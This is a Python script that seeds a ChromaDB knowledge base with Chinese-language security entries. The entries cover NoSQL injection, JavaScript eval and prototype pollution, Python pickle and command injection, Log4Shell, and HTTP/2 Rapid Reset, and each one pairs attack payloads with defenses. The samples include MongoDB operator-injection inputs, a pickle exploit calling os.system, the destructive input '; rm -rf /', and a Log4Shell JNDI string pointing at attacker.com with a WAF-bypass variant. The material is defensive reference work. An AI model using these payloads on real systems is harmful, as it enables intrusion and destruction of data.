"""
add_more_knowledge.py - 添加更多高价值安全知识

扩展知识库的三种方式：
1. 运行此脚本添加更多内置知识（无需 API）
2. 设置 NVD_API_KEY 后运行 expand_knowledge_base.py 获取更多 CVE
3. 手动添加特定领域的安全知识
"""

import os
import sys

import chromadb

# 添加项目路径
_current_dir = os.path.dirname(os.path.abspath(__file__))
_project_root = os.path.dirname(os.path.dirname(_current_dir))
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)


# 更多内置安全知识 - NoSQL 注入专题
NOSQL_INJECTION_KNOWLEDGE = [
    {
        "id": "NOSQLI-MONGO-001",
        "document": """【MongoDB 注入攻击模式】
漏洞类型: NoSQL 注入 (CWE-943)

1. 操作符注入
攻击者通过 $ne, $gt, $lt, $or 等操作符绕过认证：
- 输入: {"username": "admin", "password": {"$ne": ""}}
- 效果: 匹配密码不为空的 admin 用户

2. $where 注入
攻击者注入 JavaScript 代码：
- 输入: {"$where": "this.password == 'admin' || 1==1"}
- 效果: 返回所有记录

3. 正则注入
通过 $regex 提取数据：
- 输入: {"password": {"$regex": "^a"}}
- 效果: 暴力枚举密码

防护要点:
- 严格类型检查，拒绝对象类型输入
- 禁用或白名单 $where 操作符
- 使用 mongo-sanitize 等库
""",
        "metadata": {"type": "NOSQL_INJECTION", "source": "OWASP", "severity": "High"},
    },
    {
        "id": "NOSQLI-MONGO-002",
        "document": """【MongoDB 操作符速查表】
漏洞类型: NoSQL 注入

危险操作符列表（应严格过滤）：

查询操作符:
$ne   - 不等于，常用于绕过空值检查
$gt   - 大于，配合空字符串匹配所有非空值
$lt   - 小于
$gte  - 大于等于
$lte  - 小于等于
$in   - 在数组中，可能泄露枚举值
$nin  - 不在数组中
$or   - 逻辑或，可构造永真条件
$and  - 逻辑与
$not  - 逻辑非
$nor  - 逻辑非或

代码执行:
$where  - 执行 JavaScript，最危险
$expr   - 聚合表达式
$function - 执行 JavaScript 函数

正则:
$regex  - 正则匹配，可用于数据提取
""",
        "metadata": {"type": "NOSQL_INJECTION", "source": "OWASP", "severity": "High"},
    },
    {
        "id": "NOSQLI-PREVENTION-001",
        "document": """【NoSQL 注入防护代码示例】
漏洞类型: NoSQL 注入 (CWE-943)

Node.js + Express + MongoDB 防护示例：

1. 类型验证防护
const sanitize = require('mongo-sanitize');

app.post('/login', (req, res) => {
    // 清理输入，移除 $ 开头的键
    const username = sanitize(req.body.username);
    const password = sanitize(req.body.password);
    
    // 或者强制转为字符串
    const user = String(req.body.username);
    const pass = String(req.body.pass);
    
    db.users.findOne({ username, password });
});

2. Schema 验证
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

3. 白名单验证
function validateQuery(obj) {
    const dangerous = ['$where', '$expr', '$function', '$regex'];
    const str = JSON.stringify(obj);
    return !dangerous.some(op => str.includes(op));
}
""",
        "metadata": {"type": "NOSQL_INJECTION", "source": "OWASP", "severity": "High"},
    },
]

# 更多内置安全知识 - JavaScript 安全专题
JS_SECURITY_KNOWLEDGE = [
    {
        "id": "JS-EVAL-001",
        "document": """【JavaScript eval() 代码执行风险】
漏洞类型: 远程代码执行 (CWE-94)

危险函数:
- eval(code) - 直接执行字符串为代码
- Function(code) - 创建函数并执行
- setTimeout(code, ms) - 字符串形式会被 eval
- setInterval(code, ms) - 同上
- new Function(code) - 动态创建函数

攻击场景:
// 不安全
const userInput = "alert('XSS')";
eval(userInput);  // 执行恶意代码

// 通过 JSON.parse 绕过
const data = '{"__proto__":{"polluted":true}}';
JSON.parse(data);  // 原型污染

防护措施:
1. 永远不要 eval() 用户输入
2. 使用 JSON.parse() 替代 eval() 解析 JSON
3. 使用 Content-Security-Policy 禁止 eval
4. 使用 vm2 等沙箱执行不可信代码
""",
        "metadata": {"type": "RCE_COMMAND_EXEC", "source": "OWASP", "severity": "Critical"},
    },
    {
        "id": "JS-PROTO-001",
        "document": """【JavaScript 原型污染攻击】
漏洞类型: 原型污染 (CWE-1321)

攻击原理:
通过修改 Object.prototype 影响所有对象的行为

攻击载荷:
{
    "__proto__": {
        "admin": true
    }
}

// 或
{
    "constructor": {
        "prototype": {
            "admin": true
        }
    }
}

影响:
- 权限提升（所有用户变管理员）
- 拒绝服务（覆盖关键属性）
- 远程代码执行（配合其他漏洞）

防护:
1. Object.create(null) 创建无原型对象
2. 使用 Map 替代普通对象
3. 验证 __proto__, constructor, prototype 键
4. 使用 Object.freeze(Object.prototype)
""",
        "metadata": {"type": "RCE_COMMAND_EXEC", "source": "OWASP", "severity": "High"},
    },
]

# 更多内置安全知识 - Python 安全专题
PYTHON_SECURITY_KNOWLEDGE = [
    {
        "id": "PY-PICKLE-001",
        "document": """【Python pickle 反序列化风险】
漏洞类型: 不安全反序列化 (CWE-502)

危险场景:
import pickle

# 不安全：反序列化不可信数据
user_data = request.data
obj = pickle.loads(user_data)

攻击载荷:
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())

防护措施:
1. 永远不要 pickle.loads() 不可信数据
2. 使用 JSON 替代 pickle
3. 使用 HMAC 签名验证数据完整性
4. 使用 fickling 等工具检测恶意 pickle

安全替代:
import json
# 使用 JSON
data = json.loads(user_data)

# 或使用签名
import hmac
if hmac.compare_digest(signature, expected):
    data = pickle.loads(user_data)
""",
        "metadata": {"type": "DESERIALIZATION", "source": "OWASP", "severity": "Critical"},
    },
    {
        "id": "PY-SUBPROCESS-001",
        "document": """【Python subprocess 命令注入】
漏洞类型: 命令注入 (CWE-78)

危险用法:
import subprocess

# 不安全：shell=True + 用户输入
filename = request.args.get('file')
subprocess.call(f'cat {filename}', shell=True)

# 攻击输入: "; rm -rf /"

安全用法:
import subprocess
import shlex

# 方法1：使用列表参数
subprocess.call(['cat', filename])

# 方法2：使用 shlex.quote()
subprocess.call(f'cat {shlex.quote(filename)}', shell=True)

# 方法3：白名单验证
import re
if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
    raise ValueError('Invalid filename')

# 方法4：完全避免 shell
from pathlib import Path
content = Path(filename).read_text()
""",
        "metadata": {"type": "RCE_COMMAND_EXEC", "source": "OWASP", "severity": "Critical"},
    },
]

# 真实 CVE 案例
REAL_WORLD_CVES = [
    {
        "id": "CVE-2021-44228-详解",
        "document": """【CVE-2021-44228 Log4Shell 详解】
漏洞类型: 远程代码执行 (CWE-917)
CVSS: 10.0 (Critical)

影响范围:
Apache Log4j 2.0-beta9 到 2.14.1

漏洞原理:
Log4j 的 JNDI Lookup 功能允许在日志消息中执行 LDAP/RMI 查询，
攻击者可以通过构造特殊的日志消息触发远程代码执行。

攻击载荷:
${jndi:ldap://attacker.com/exploit}
${${lower:j}${lower:n}${lower:d}${lower:i}:...}  (绕过WAF)

影响:
- 全球数百万 Java 应用受影响
- 包括 Apple iCloud、Steam、Minecraft 等

修复:
1. 升级到 Log4j 2.17.0+
2. 设置 log4j2.formatMsgNoLookups=true
3. 移除 JndiLookup 类

检测方法:
- 搜索 log4j-core-2.*.jar
- 使用 log4shell 扫描工具
""",
        "metadata": {"type": "RCE_COMMAND_EXEC", "source": "NVD", "severity": "Critical", "cve": "CVE-2021-44228"},
    },
    {
        "id": "CVE-2023-44487-详解",
        "document": """【CVE-2023-44487 HTTP/2 Rapid Reset 详解】
漏洞类型: 拒绝服务 (CWE-400)
CVSS: 7.5 (High)

影响范围:
所有支持 HTTP/2 的 Web 服务器

漏洞原理:
HTTP/2 协议允许客户端快速发送和取消请求（RST_STREAM），
攻击者利用此特性发起大规模 DoS 攻击，每秒可发送数十万请求。

攻击方式:
1. 建立 HTTP/2 连接
2. 快速发送大量请求
3. 立即发送 RST_STREAM 取消请求
4. 服务器资源耗尽

影响:
- Google、Cloudflare、AWS 等遭受攻击
- 峰值达到 3.98 亿 RPS

修复:
1. 限制 RST_STREAM 频率
2. 更新 Web 服务器到最新版本
3. 配置连接数和请求数限制
""",
        "metadata": {"type": "GENERAL", "source": "NVD", "severity": "High", "cve": "CVE-2023-44487"},
    },
]


def add_knowledge_to_db():
    """添加知识到数据库"""
    client = chromadb.PersistentClient(path="./data/aegis_db")
    collection = client.get_or_create_collection(name="cve_core")

    print(f"📊 当前记录数: {collection.count()}")

    all_knowledge = NOSQL_INJECTION_KNOWLEDGE + JS_SECURITY_KNOWLEDGE + PYTHON_SECURITY_KNOWLEDGE + REAL_WORLD_CVES

    added = 0
    for item in all_knowledge:
        existing = collection.get(ids=[item["id"]])
        if existing["ids"]:
            print(f"⏭️ 跳过: {item['id']}")
            continue

        collection.add(ids=[item["id"]], documents=[item["document"]], metadatas=[item["metadata"]])
        added += 1
        print(f"✅ 添加: {item['id']}")

    print(f"\n📈 新增: {added} 条")
    print(f"📊 更新后记录数: {collection.count()}")


if __name__ == "__main__":
    add_knowledge_to_db()
